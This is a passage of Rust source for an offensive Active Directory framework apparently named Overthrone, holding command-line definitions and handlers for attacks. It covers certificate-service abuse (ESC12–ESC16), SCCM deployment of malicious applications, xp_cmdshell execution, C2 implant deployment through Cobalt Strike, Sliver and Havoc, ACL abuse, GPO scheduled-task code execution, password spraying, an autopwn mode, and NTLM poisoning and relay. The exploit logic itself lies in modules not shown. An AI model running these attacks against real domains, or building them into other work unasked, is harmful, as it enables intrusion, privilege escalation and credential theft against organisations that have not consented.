        /// LIVE SMB password for live registry read
        #[arg(long)]
        smb_pass: Option<String>,
        /// LIVE SMB domain for live registry read
        #[arg(long)]
        smb_domain: Option<String>,
    },
    /// ESC12 — CA private key exfiltration via shell access to the CA server
    Esc12 {
        /// CA server hostname or IP
        #[arg(short, long, required = true)]
        ca_host: String,
        /// CA common name (e.g. corp-CA01)
        #[arg(short = 'N', long, required = true)]
        ca_name: String,
        /// Privileged account on the CA server
        #[arg(short = 'U', long, default_value = "Administrator")]
        operator: String,
        /// Path on the CA server to write the backup
        #[arg(short, long, default_value = r"C:\Windows\Temp\cabackup")]
        backup_path: String,
    },
    /// ESC13 — Issuance Policy OID linked to privileged group (msDS-OIDToGroupLink)
    Esc13 {
        /// CA web enrollment server
        #[arg(short, long, required = true)]
        ca: String,
        /// Certificate template containing the linked issuance policy OID
        #[arg(short, long, required = true)]
        template: String,
        /// The issuance policy OID value linked to a privileged group
        #[arg(short = 'P', long, required = true)]
        policy_oid: String,
        /// DN of the privileged group linked to the OID
        #[arg(short = 'G', long, required = true)]
        linked_group_dn: String,
        /// Subject CN for the certificate request
        #[arg(short, long, default_value = "overthrone-esc13")]
        subject: String,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc13_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc13_cert.pfx"
        )]
        output: String,
    },
    /// ESC14 — Certificate mapping / altSecurityIdentities guidance
    Esc14 {
        /// Target account DN (e.g. CN=Administrator,CN=Users,DC=corp,DC=local)
        #[arg(short = 'T', long, required = true)]
        target_dn: String,
        /// Target account sAMAccountName
        #[arg(short = 'S', long, required = true)]
        target_sam: String,
        /// Certificate mapping value to write (e.g. `X509:<RFC822>admin@corp.local`)
        #[arg(short = 'M', long, required = true)]
        mapping: String,
        /// DC IP/hostname for LDAP modification
        #[arg(short, long)]
        dc: Option<String>,
        /// LIVE Perform live LDAP modification (requires ldap-user/ldap-pass)
        #[arg(long)]
        live: bool,
    },
    /// ESC15 — Schema V1 template with enrollee-supplied subject (EKUwu)
    Esc15 {
        /// CA web enrollment server
        #[arg(short, long, required = true)]
        ca: String,
        /// Schema V1 template name
        #[arg(short, long, required = true)]
        template: String,
        /// Target user to impersonate via SAN
        #[arg(short = 'U', long, required = true)]
        target_user: String,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc15_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc15_cert.pfx"
        )]
        output: String,
    },
    /// ESC16 — CA security extension disabled path
    Esc16 {
        /// CA web enrollment server
        #[arg(short, long, required = true)]
        ca: String,
        /// Template name (with NO_SECURITY_EXTENSION flag)
        #[arg(short, long, required = true)]
        template: String,
        /// Target UPN to impersonate
        #[arg(short = 'T', long, required = true)]
        target_upn: String,
        /// Victim account whose UPN will be poisoned
        #[arg(short = 'V', long, required = true)]
        victim: String,
        /// Original UPN of the victim (for cleanup)
        #[arg(short = 'R', long, required = true)]
        original_upn: String,
        /// LDAP URL (e.g. ldap://dc01.corp.local)
        #[arg(short, long, default_value = "ldap://dc01.corp.local")]
        ldap_url: String,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc16_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc16_cert.pfx"
        )]
        output: String,
    },
    /// Request a certificate
    Request {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
        #[arg(short, long)]
        subject: Option<String>,
        #[arg(short = 'S', long)]
        san: Option<String>,
        #[arg(
            id = "adcs_request_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "cert.pfx"
        )]
        output: String,
    },
}

// ──────────────────────────────────────────────────────────
// SCCM sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum SccmAction {
    /// Enumerate SCCM/MECM configuration
    Enum {
        /// SCCM site server
        #[arg(short, long)]
        site_server: Option<String>,
    },
    /// Abuse SCCM for lateral movement
    Abuse {
        /// Target site server
        #[arg(short, long, required = true)]
        site_server: String,
        /// Abuse technique
        #[arg(short, long, value_enum, default_value = "client-push")]
        technique: SccmTechnique,
    },
    /// Deploy malicious application
    Deploy {
        /// Target collection
        #[arg(short, long, required = true)]
        collection: String,
        /// Application name
        #[arg(short, long, required = true)]
        app_name: String,
        /// Payload path
        #[arg(short = 'P', long, required = true)]
        payload: String,
    },
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum SccmTechnique {
    /// Client push installation abuse
    ClientPush,
    /// Application deployment abuse
    AppDeploy,
    /// Task sequence abuse
    TaskSequence,
    /// Collection modification
    CollectionMod,
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum ShellType {
    /// WinRM-based shell
    Winrm,
    /// SMB-based shell (PsExec style)
    Smb,
    /// WMI-based shell
    Wmi,
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum ScanType {
    /// SYN scan (requires raw sockets/root)
    Syn,
    /// TCP connect scan
    Connect,
    /// ACK scan (firewall mapping)
    Ack,
}

// ──────────────────────────────────────────────────────────
// MSSQL sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum MssqlAction {
    /// Execute SQL query on target server
    Query {
        #[arg(short, long, required = true)]
        target: String,
        #[arg(short, long, required = true)]
        query: String,
        #[arg(short = 'D', long, default_value = "master")]
        database: String,
    },
    /// Execute command via xp_cmdshell
    XpCmdShell {
        #[arg(short, long, required = true)]
        target: String,
        #[arg(short, long, required = true)]
        command: String,
    },
    /// Enumerate linked servers
    LinkedServers {
        #[arg(short, long, required = true)]
        target: String,
    },
    /// Enable xp_cmdshell on target
    EnableXpCmdShell {
        #[arg(short, long, required = true)]
        target: String,
    },
    /// Check if xp_cmdshell is enabled
    CheckXpCmdShell {
        #[arg(short, long, required = true)]
        target: String,
    },
}

// ──────────────────────────────────────────────────────────
// NEW: Plugin sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum PluginAction {
    /// List all loaded plugins
    List,
    /// Show info about a specific plugin
    Info {
        /// Plugin ID
        plugin_id: String,
    },
    /// Execute a plugin command
    Exec {
        /// Plugin command name
        command: String,
        /// Command arguments (--key value pairs)
        #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
        args: Vec<String>,
    },
    /// Load a plugin from a file path
    Load {
        /// Path to .so/.dll/.wasm file
        path: String,
    },
    /// Unload a plugin by ID
    Unload {
        /// Plugin ID
        plugin_id: String,
    },
    /// Enable a disabled plugin
    Enable {
        /// Plugin ID
        plugin_id: String,
    },
    /// Disable a plugin without unloading
    Disable {
        /// Plugin ID
        plugin_id: String,
    },
}

// ──────────────────────────────────────────────────────────
// NEW: C2 sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum C2Action {
    /// Connect to a C2 teamserver
    Connect {
        /// Framework: cs, sliver, havoc
        framework: String,
        /// Teamserver host
        host: String,
        /// Teamserver port
        port: u16,
        /// Password (for Cobalt Strike)
        #[arg(long)]
        password: Option<String>,
        /// Token (for Havoc)
        #[arg(long)]
        token: Option<String>,
        /// Sliver operator config file path
        #[arg(long)]
        config: Option<String>,
        /// Channel name
        #[arg(long, default_value = "default")]
        name: Option<String>,
        /// Skip TLS verification
        #[arg(long)]
        skip_verify: bool,
    },
    /// Show C2 channels and active sessions
    Status,
    /// Execute a command on a C2 session
    Exec {
        /// Session/beacon ID
        session_id: String,
        /// Command to execute
        command: String,
        /// Use PowerShell
        #[arg(short = 'P', long)]
        powershell: bool,
    },
    /// Deploy an implant to a target
    Deploy {
        /// C2 channel name
        channel: String,
        /// Target hostname or IP
        target: String,
        /// Listener name on the teamserver
        listener: String,
    },
    /// Disconnect from a C2 teamserver
    Disconnect {
        /// Channel name (or 'all')
        channel: String,
    },
    /// List available listeners on a C2 teamserver
    Listeners {
        /// Channel name
        channel: String,
    },
}

// ──────────────────────────────────────────────────────────
// ACL sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum AclAction {
    /// Force-change a user's password (requires ForceChangePassword extended right or GenericAll)
    ForcePassword {
        /// Target user DN or sAMAccountName
        #[arg(short, long, required = true)]
        target: String,
        /// New password to set
        #[arg(short, long, required = true)]
        password: String,
    },
    /// Add a user to a group (requires WriteProperty/member or GenericAll)
    AddMember {
        /// Group DN
        #[arg(short, long, required = true)]
        group: String,
        /// Member DN to add
        #[arg(short, long, required = true)]
        member: String,
    },
    /// Remove a user from a group
    RemoveMember {
        /// Group DN
        #[arg(short, long, required = true)]
        group: String,
        /// Member DN to remove
        #[arg(short, long, required = true)]
        member: String,
    },
    /// Grant GenericAll to a trustee on a target object (requires WriteDACL)
    WriteDacl {
        /// Target object DN
        #[arg(short, long, required = true)]
        target: String,
        /// Trustee sAMAccountName (resolved to SID automatically)
        #[arg(long, required = true)]
        trustee: String,
    },
    /// Set an SPN on a user for targeted Kerberoasting (requires WriteProperty/SPN or GenericAll)
    WriteSpn {
        /// Target user DN
        #[arg(short, long, required = true)]
        target: String,
        /// SPN to add (e.g. cifs/fake.corp.local)
        #[arg(short = 's', long, required = true)]
        spn: String,
    },
    /// Remove an SPN from a user (cleanup)
    RemoveSpn {
        /// Target user DN
        #[arg(short, long, required = true)]
        target: String,
        /// SPN to remove
        #[arg(short = 's', long, required = true)]
        spn: String,
    },
    /// Enumerate abusable ACEs for the current/specified trustee SID
    Enum {
        /// SID to check (default: current user's SID from --domain/--username)
        #[arg(long)]
        sid: Option<String>,
    },
}

// ──────────────────────────────────────────────────────────
// GPO sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum GpoAction {
    /// Enumerate all GPOs and their links
    Enum,
    /// Write an ImmediateTask XML to SYSVOL for code execution via Computer/User GPO
    Write {
        /// GPO name or CN (e.g. {GUID} or display name)
        #[arg(short, long, required = true)]
        gpo: String,
        /// SYSVOL share path (e.g. \\dc01.corp.local\SYSVOL\corp.local\Policies)
        #[arg(long, required = true)]
        sysvol: String,
        /// Command to execute (runs as SYSTEM for Computer GPO)
        #[arg(short, long, required = true)]
        command: String,
        /// Task name (appears in Windows Task Scheduler briefly)
        #[arg(long, default_value = "OT-Maint")]
        task_name: String,
        /// Apply to User policy directory instead of Machine
        #[arg(long)]
        user_policy: bool,
    },
    /// Remove a previously-written ImmediateTask XML (cleanup)
    Cleanup {
        /// GPO name or CN
        #[arg(short, long, required = true)]
        gpo: String,
        /// SYSVOL share path
        #[arg(long, required = true)]
        sysvol: String,
        /// Task name to remove
        #[arg(long, default_value = "OT-Maint")]
        task_name: String,
        /// Was written to User policy directory
        #[arg(long)]
        user_policy: bool,
    },
}

// ──────────────────────────────────────────────────────────
// Main
// ──────────────────────────────────────────────────────────

fn main() -> ExitCode {
    // Spawn on a thread with 8 MB stack — the CLI parser with 28 subcommands
    // and nested enums can exceed the default 1 MB stack in debug builds.
    let thread = match std::thread::Builder::new()
        .stack_size(8 * 1024 * 1024)
        .spawn(|| -> i32 {
            match tokio::runtime::Builder::new_multi_thread()
                .enable_all()
                .build()
            {
                Ok(rt) => rt.block_on(async_main()),
                Err(e) => {
                    banner::print_fail(&format!("Failed to build tokio runtime: {}", e));
                    1
                }
            }
        }) {
        Ok(h) => h,
        Err(e) => {
            banner::print_fail(&format!("Failed to spawn main thread: {}", e));
            return ExitCode::from(1);
        }
    };

    match thread.join() {
        Ok(exit_code) => ExitCode::from(exit_code as u8),
        Err(_) => {
            banner::print_fail("Main thread panicked");
            ExitCode::from(1)
        }
    }
}

async fn async_main() -> i32 {
    if let Err(e) = install_rustls_provider() {
        banner::print_fail(&e);
        return 1;
    }

    let cli = Cli::parse();

    let filter = match cli.verbose {
        0 => "warn",
        1 => "info",
        2 => "debug",
        _ => "trace",
    };

    fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(filter)),
        )
        .with_target(false)
        .compact()
        .init();

    banner::print_banner();

    // Register all built-in modules (core + extended CME-style)
    // This ensures `ovt module list` returns available modules.
    ovt_modules::register_core_modules().await;
    modules_ext::register_extended_modules().await;

    match *cli.command {
        Commands::Wizard { args } => match commands::wizard::run(args.clone()).await {
            Ok(_) => 0,
            Err(e) => {
                banner::print_fail(&format!("Wizard error: {}", e));
                1
            }
        },
        Commands::Reaper {
            ref modules,
            page_size,
        } => cmd_reaper(&cli, modules.clone(), page_size).await,
        Commands::Snaffler { page_size } => cmd_snaffler(&cli, page_size).await,
        Commands::Enum {
            ref target,
            ref filter,
            include_disabled,
        } => cmd_enum(&cli, target.clone(), filter.clone(), include_disabled).await,
        Commands::Powerview { ref action } => cmd_powerview(&cli, action.clone()).await,
        Commands::Guid { ref action } => cmd_guid(action.clone()),
        Commands::Kerberos { ref action } => cmd_kerberos(&cli, action.clone()).await,
        Commands::Smb { ref action } => cmd_smb(&cli, action.clone()).await,
        Commands::Exec {
            ref method,
            ref target,
            ref command,
        } => cmd_exec(&cli, method.clone(), target, command).await,
        Commands::Graph {
            ref file,
            ref action,
        } => cmd_graph(&cli, file.as_deref(), action.clone()).await,
        Commands::Spray {
            ref password,
            ref userlist,
            use_ldap,
            delay,
            jitter,
            concurrency,
        } => {
            cmd_spray(
                &cli,
                password,
                userlist.as_deref(),
                use_ldap,
                delay,
                jitter,
                concurrency,
            )
            .await
        }
        Commands::AutoPwn {
            ref target,
            ref method,
            stealth,
            dry_run,
            max_stage,
            adaptive,
            ref q_table,
            jitter_ms,
            ldaps,
            timeout,
            playbook,
            ref config,
            ref resume,
        } => {
            cmd_autopwn(
                &cli,
                AutoPwnArgs {
                    target: target.clone(),
                    method: method.clone(),
                    stealth,
                    dry_run,
                    max_stage,
                    adaptive,
                    q_table: q_table.clone(),
                    jitter_ms,
                    ldaps,
                    timeout,
                    playbook,
                    config: config.clone(),
                    resume: resume.clone(),
                    bootstrap_no_creds: false,
                    userlist: None,
                    use_ldap: false,
                    concurrency: 10,
                },
            )
            .await
        }
        Commands::AutoPwnPreauth {
            ref target,
            ref method,
            stealth,
            dry_run,
            max_stage,
            adaptive,
            ref q_table,
            jitter_ms,
            ldaps,
            timeout,
            playbook,
            ref config,
            ref resume,
            ref userlist,
            use_ldap,
            concurrency,
        } => {
            cmd_autopwn(
                &cli,
                AutoPwnArgs {
                    target: target.clone(),
                    method: method.clone(),
                    stealth,
                    dry_run,
                    max_stage,
                    adaptive,
                    q_table: q_table.clone(),
                    jitter_ms,
                    ldaps,
                    timeout,
                    playbook,
                    config: config.clone(),
                    resume: resume.clone(),
                    bootstrap_no_creds: true,
                    userlist: userlist.clone(),
                    use_ldap,
                    concurrency,
                },
            )
            .await
        }
        Commands::Dump {
            ref target,
            ref source,
        } => commands_impl::cmd_dump(&cli, target, source.clone()).await,
        Commands::Doctor {
            ref checks,
            ref target_dc,
        } => {
            let checks_opt = if checks.is_empty() {
                None
            } else {
                Some(checks.clone())
            };
            let mut exit = commands::doctor::run(checks_opt).await;
            if let Some(dc) = target_dc {
                exit |= crate::commands::doctor::check_dc_connectivity(dc)
                    .await
                    .iter()
                    .any(|r| !r.passed) as i32;
            }
            exit
        }
        Commands::Report {
            ref input,
            ref output,
            ref format,
        } => commands_impl::cmd_report(&cli, input, output, format.clone()).await,
        Commands::Forge { ref action } => commands_impl::cmd_forge(&cli, action).await,
        Commands::Crack {
            ref hash,
            ref file,
            ref mode,
            ref wordlist,
            max_candidates,
        } => {
            commands_impl::cmd_crack(
                &cli,
                hash.as_deref(),
                file.as_deref(),
                mode.clone(),
                wordlist.as_deref(),
                max_candidates,
            )
            .await
        }
        Commands::Rid {
            start_rid,
            end_rid,
            null_session,
        } => commands_impl::cmd_rid(&cli, start_rid, end_rid, null_session).await,
        Commands::Move { ref action } => commands_impl::cmd_move(&cli, action).await,
        Commands::Gpp {
            ref file,
            ref cpassword,
        } => commands_impl::cmd_gpp(&cli, file.as_deref(), cpassword.as_deref()).await,
        Commands::Laps { ref computer } => commands_impl::cmd_laps(&cli, computer.as_deref()).await,
        Commands::Secrets { ref action } => commands_impl::cmd_secrets(action).await,
        Commands::Ntlm { ref action } => cmd_ntlm(action.clone()).await,
        Commands::Adcs { ref action } => commands_impl::cmd_adcs(&cli, action).await,
        Commands::Shell {
            ref target,
            ref shell_type,
        } => commands_impl::cmd_shell(target, shell_type).await,
        Commands::Sccm { ref action } => commands_impl::cmd_sccm(&cli, action).await,
        Commands::Scan {
            ref targets,
            ref ports,
            ref scan_type,
            timeout,
            ldap,
            smb,
            no_ldap,
            no_smb,
        } => {
            commands_impl::cmd_scan(
                &cli,
                targets,
                ports,
                scan_type,
                timeout,
                ldap && !no_ldap,
                smb && !no_smb,
            )
            .await
        }
        Commands::Mssql { ref action } => cmd_mssql(&cli, action.clone()).await,
        Commands::Tui {
            ref domain,
            crawl,
            ref load,
        } => commands_impl::cmd_tui(&cli, domain, crawl, load.as_deref()).await,

        // ─── NEW: Plugin handler ─────────────────────────────
        Commands::Plugin { ref action } => {
            let mut plugin_registry = PluginRegistry::new();
            let ctx = make_plugin_context(&cli);
            commands_impl::cmd_plugin(&cli, &mut plugin_registry, &ctx, action.clone()).await
        }

        // ─── Module handler ──────────────────────────────────
        Commands::Module { ref action } => match action {
            ModuleAction::List { category } => {
                commands_impl::cmd_module_list(&cli, category.as_deref()).await
            }
            ModuleAction::Info { name } => commands_impl::cmd_module_info(&cli, name.clone()).await,
            ModuleAction::Run {
                name,
                target,
                params,
            } => {
                commands_impl::cmd_module_run(&cli, name.clone(), target.clone(), params.clone())
                    .await
            }
            ModuleAction::RunParallel {
                name,
                targets,
                params,
                concurrency,
            } => {
                commands_impl::cmd_module_run_parallel(
                    &cli,
                    name.clone(),
                    targets.clone(),
                    params.clone(),
                    *concurrency,
                )
                .await
            }
        },

        // ─── NEW: C2 handler ─────────────────────────────────
        Commands::C2 { ref action } => {
            let mut c2_manager = C2Manager::new();
            commands_impl::cmd_c2(&mut c2_manager, action.clone()).await
        }

        // ─── ACL abuse handler ───────────────────────────────
        Commands::Acl { ref action } => cmd_acl(&cli, action.clone()).await,

        // ─── GPO abuse handler ───────────────────────────────
        Commands::Gpo { ref action } => cmd_gpo(&cli, action.clone()).await,

        // ─── Shell completion generation ─────────────────────
        Commands::Completions {
            shell,
            output: ref completion_output,
        } => {
            let clap_shell = match shell {
                CompletionShell::Bash => ClapShell::Bash,
                CompletionShell::Fish => ClapShell::Fish,
                CompletionShell::Zsh => ClapShell::Zsh,
                CompletionShell::PowerShell => ClapShell::PowerShell,
                CompletionShell::Elvish => ClapShell::Elvish,
            };
            let mut cmd = Cli::command();
            if let Some(path) = completion_output.as_deref() {
                match std::fs::File::create(path) {
                    Ok(mut f) => {
                        clap_generate(clap_shell, &mut cmd, "ovt", &mut f);
                        eprintln!("Completions written to: {}", path);
                    }
                    Err(e) => {
                        banner::print_fail(&format!("Failed to create file '{}': {}", path, e));
                        return 1;
                    }
                }
            } else {
                clap_generate(clap_shell, &mut cmd, "ovt", &mut std::io::stdout());
            }
            0
        }
    }
}

// ──────────────────────────────────────────────────────────
// NEW: Plugin Context Helper
// ──────────────────────────────────────────────────────────

fn make_plugin_context(cli: &Cli) -> PluginContext {
    let domain = cli.domain.clone().unwrap_or_else(|| "local".to_string());
    PluginContext {
        domain,
        dc_ip: cli.dc_host.clone(),
        credentials: None,
        graph: Arc::new(RwLock::new(AttackGraph::new())),
        state: Arc::new(RwLock::new(HashMap::new())),
        log_prefix: "cli".to_string(),
    }
}

// ──────────────────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────────────────

fn require_creds(cli: &Cli) -> std::result::Result<Credentials, i32> {
    let domain = match cli.domain.as_deref() {
        Some(d) => d,
        None => {
            banner::print_fail("--domain is required");
            return Err(1);
        }
    };

    let username = match cli.username.as_deref() {
        Some(u) => u,
        None => {
            banner::print_fail("--username is required");
            return Err(1);
        }
    };

    Credentials::from_args(
        domain,
        username,
        cli.password.as_deref(),
        cli.nt_hash.as_deref(),
        cli.ticket.as_deref(),
        Some(cli.auth_method.clone()),
    )
    .map_err(|e| {
        banner::print_fail(&format!("Auth error: {}", e));
        1
    })
}

/// Retrieve credentials if available without terminating on missing arguments
fn require_creds_silent(cli: &Cli) -> std::result::Result<Credentials, String> {
    let domain = cli.domain.as_deref().ok_or("Missing --domain")?;
    let username = cli.username.as_deref().ok_or("Missing --username")?;

    Credentials::from_args(
        domain,
        username,
        cli.password.as_deref(),
        cli.nt_hash.as_deref(),
        cli.ticket.as_deref(),
        Some(cli.auth_method.clone()),
    )
    .map_err(|e| e.to_string())
}

/// Require credentials for operations that need domain and DC access
/// but not a specific username. Used by spray operations.
fn require_dc_only_creds(cli: &Cli) -> std::result::Result<String, i32> {
    match cli.domain.as_deref() {
        Some(domain) => Ok(domain.to_string()),
        None => {
            banner::print_fail("--domain is required");
            Err(1)
        }
    }
}

fn require_dc(cli: &Cli) -> std::result::Result<String, i32> {
    cli.dc_host.clone().ok_or_else(|| {
        banner::print_fail("--dc-host is required");
        1
    })
}

fn make_reaper_config(
    cli: &Cli,
    creds: Credentials,
    dc: String,
    modules: Vec<String>,
    page_size: u32,
) -> std::result::Result<ReaperConfig, i32> {
    let domain = match cli.domain.clone() {
        Some(d) => d,
        None => {
            banner::print_fail("--domain is required");
            return Err(1);
        }
    };
    let base_dn = ReaperConfig::base_dn_from_domain(&domain);

    Ok(ReaperConfig {
        dc_ip: dc,
        domain,
        base_dn,
        username: creds.username.clone(),
        password: creds.password().map(str::to_string),
        nt_hash: creds.nthash().map(str::to_string),
        modules,
        page_size,
        use_ldaps: false,
    })
}

// ──────────────────────────────────────────────────────────
// Command handlers (existing — kept as-is)
// ──────────────────────────────────────────────────────────

// cmd_reaper
async fn cmd_reaper(cli: &Cli, modules: Vec<String>, page_size: u32) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let dc = match cli.dc_host.clone() {
        Some(d) => d,
        None => {
            banner::print_fail("--dc-host is required");
            return 1;
        }
    };

    let config = match make_reaper_config(cli, creds, dc, modules, page_size) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match overthrone_reaper::runner::run_reaper(&config).await {
        Ok(_) => 0,
        Err(e) => {
            banner::print_fail(&format!("Reaper error: {}", e));
            1
        }
    }
}

async fn cmd_snaffler(cli: &Cli, page_size: u32) -> i32 {
    banner::print_module_banner("SNAFFLER");

    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let config = match make_reaper_config(cli, creds, dc, vec!["snaffler".to_string()], page_size) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match overthrone_reaper::snaffler::run_snaffler(&config).await {
        Ok(findings) => {
            if matches!(cli.stdout_format, OutputFormat::Json) {
                let json = serde_json::to_string_pretty(&findings)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"));
                println!("{json}");
                if let Some(path) = &cli.outfile
                    && let Err(e) = std::fs::write(path, &json)
                {
                    eprintln!("warn: failed to write output file '{}': {}", path, e);
                }
                return 0;
            }

            if findings.is_empty() {
                banner::print_info("No sensitive files matched the Snaffler patterns");
            } else {
                banner::print_success(&format!("Found {} sensitive files", findings.len()));
                for finding in &findings {
                    println!(
                        "  [S{}] \\\\{}\\{}\\{} - {} ({} bytes)",
                        finding.severity,
                        finding.hostname,
                        finding.share,
                        finding.path,
                        finding.reason,
                        finding.size
                    );
                }
                if let Some(path) = &cli.outfile {
                    let json = serde_json::to_string_pretty(&findings).unwrap_or_default();
                    if let Err(e) = std::fs::write(path, &json) {
                        eprintln!("warn: failed to write output file '{}': {}", path, e);
                    }
                }
            }
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Snaffler error: {}", e));
            1
        }
    }
}

async fn cmd_powerview(cli: &Cli, action: PowerViewAction) -> i32 {
    match action {
        PowerViewAction::Users {
            identity,
            filter,
            include_disabled,
        } => {
            cmd_enum(
                cli,
                EnumTarget::Users,
                identity.or(filter),
                include_disabled,
            )
            .await
        }
        PowerViewAction::Computers {
            filter,
            include_disabled,
        } => cmd_enum(cli, EnumTarget::Computers, filter, include_disabled).await,
        PowerViewAction::Groups { group, filter } => {
            cmd_enum(cli, EnumTarget::Groups, group.or(filter), false).await
        }
        PowerViewAction::Trusts => cmd_enum(cli, EnumTarget::Trusts, None, false).await,
        PowerViewAction::Spns => cmd_enum(cli, EnumTarget::Spns, None, false).await,
        PowerViewAction::Asrep => cmd_enum(cli, EnumTarget::Asrep, None, false).await,
        PowerViewAction::Delegations => cmd_enum(cli, EnumTarget::Delegations, None, false).await,
        PowerViewAction::Gpos { name } => cmd_enum(cli, EnumTarget::Gpos, name, false).await,
        PowerViewAction::Policy => cmd_enum(cli, EnumTarget::Policy, None, false).await,
        PowerViewAction::Laps { computer } => {
            commands_impl::cmd_laps(cli, computer.as_deref()).await
        }
        PowerViewAction::Acls { sid } => cmd_acl(cli, AclAction::Enum { sid }).await,
        PowerViewAction::All => cmd_enum(cli, EnumTarget::All, None, false).await,
    }
}

#[derive(Clone, Copy)]
struct GuidEntry {
    guid: &'static str,
    name: &'static str,
    category: &'static str,
    maps_to: &'static str,
    note: &'static str,
}

const AD_GUIDS: &[GuidEntry] = &[
    GuidEntry {
        guid: "00299570-246d-11d0-a768-00aa006e0529",
        name: "User-Force-Change-Password",
        category: "ControlAccessRight",
        maps_to: "ForceChangePassword",
        note: "Lets the trustee reset a user password without knowing the current password.",
    },
    GuidEntry {
        guid: "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
        name: "DS-Replication-Get-Changes",
        category: "ControlAccessRight",
        maps_to: "GetChanges",
        note: "One of the replication rights required for DCSync-style secret replication.",
    },
    GuidEntry {
        guid: "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
        name: "DS-Replication-Get-Changes-All",
        category: "ControlAccessRight",
        maps_to: "GetChangesAll",
        note: "Pairs with Get-Changes for full secret replication impact.",
    },
    GuidEntry {
        guid: "89e95b76-444d-4c62-991a-0facbeda640c",
        name: "DS-Replication-Get-Changes-In-Filtered-Set",
        category: "ControlAccessRight",
        maps_to: "GetChangesInFilteredSet",
        note: "Filtered-set replication right; important on hardened domains and RODC-related paths.",
    },
    GuidEntry {
        guid: "bf9679c0-0de6-11d0-a285-00aa003049e2",
        name: "member",
        category: "AttributeSchema",
        maps_to: "AddMembers/WriteSelf",
        note: "WriteProperty(member) or validated self-membership can add principals to groups.",
    },
];

fn cmd_guid(action: GuidAction) -> i32 {
    match action {
        GuidAction::Resolve { value } => {
            let query = normalize_guid_query(&value);
            let matches: Vec<_> = AD_GUIDS
                .iter()
                .copied()
                .filter(|entry| guid_entry_matches(*entry, &query))
                .collect();
            if matches.is_empty() {
                banner::print_fail(&format!("No built-in GUID mapping found for '{}'", value));
                println!(
                    "Tip: use `ovt powerview acls` or `ovt acl enum` against LDAP to inspect live objectType GUIDs."
                );
                return 1;
            }
            for entry in matches {
                print_guid_entry(entry);
            }
            0
        }
        GuidAction::List { filter } => {
            let query = filter.as_deref().map(normalize_guid_query);
            for entry in AD_GUIDS
                .iter()
                .copied()
                .filter(|entry| query.as_ref().is_none_or(|q| guid_entry_matches(*entry, q)))
            {
                print_guid_entry(entry);
            }
            0
        }
    }
}

fn normalize_guid_query(value: &str) -> String {
    value
        .trim()
        .replace(['{', '}'], "")
        .replace([' ', '_'], "-")
        .to_ascii_lowercase()
}

fn guid_entry_matches(entry: GuidEntry, query: &str) -> bool {
    entry.guid.eq_ignore_ascii_case(query)
        || entry.name.to_ascii_lowercase().contains(query)
        || entry.category.to_ascii_lowercase().contains(query)
        || entry.maps_to.to_ascii_lowercase().contains(query)
}

fn print_guid_entry(entry: GuidEntry) {
    println!("{}", entry.name.bold().cyan());
    println!("  GUID:     {}", entry.guid.yellow());
    println!("  Category: {}", entry.category);
    println!("  OVT edge: {}", entry.maps_to.green());
    println!("  Note:     {}", entry.note);
}

// cmd_ntlm
async fn cmd_ntlm(action: NtlmAction) -> i32 {
    use overthrone_relay::{Protocol, RelayController, RelayControllerConfig, RelayTarget};
    use std::net::SocketAddr;

    banner::print_module_banner("NTLM RELAY");

    match action {
        NtlmAction::Capture {
            interface,
            port: _,
            no_poison,
        } => {
            println!(
                "{} Starting NTLM capture on {} {}",
                "🎯".bright_black(),
                interface.cyan(),
                if no_poison {
                    "(relay-only / no poison)"
                } else {
                    ""
                }
            );
            let config = RelayControllerConfig {
                interface: interface.clone(),
                llmnr: true,
                nbtns: true,
                mdns: false,
                mitm6: false,
                responder: true,
                relay_targets: vec![],
                challenge: None,
                wpad_script: None,
                downgrade_auth: false,
                no_poison,
            };
            let mut controller = RelayController::new(config);
            match controller.initialize().await {
                Ok(_) => match controller.start().await {
                    Ok(_) => {
                        banner::print_success("NTLM capture started");
                        0
                    }
                    Err(e) => {
                        banner::print_fail(&format!("Capture failed: {}", e));
                        1
                    }
                },
                Err(e) => {
                    banner::print_fail(&format!("Controller init failed: {}", e));
                    1
                }
            }
        }
        NtlmAction::Relay {
            targets,
            port: _,
            command,
            no_poison,
        } => {
            println!(
                "{} Starting NTLM relay to {} targets {}",
                "🎯".bright_black(),
                targets.join(", ").cyan(),
                if no_poison { "(relay-only)" } else { "" }
            );

            let relay_targets: Vec<RelayTarget> = targets
                .iter()
                .filter_map(|t| {
                    let parts: Vec<&str> = t.split(':').collect();
                    let ip = parts[0].to_string();
                    let port = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(445);
                    let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
                    let protocol = if port == 80 {
                        Protocol::Http
                    } else if port == 443 {
                        Protocol::Https
                    } else {
                        Protocol::Smb
                    };
                    Some(RelayTarget {
                        address: addr,
                        protocol,
                        username: None,
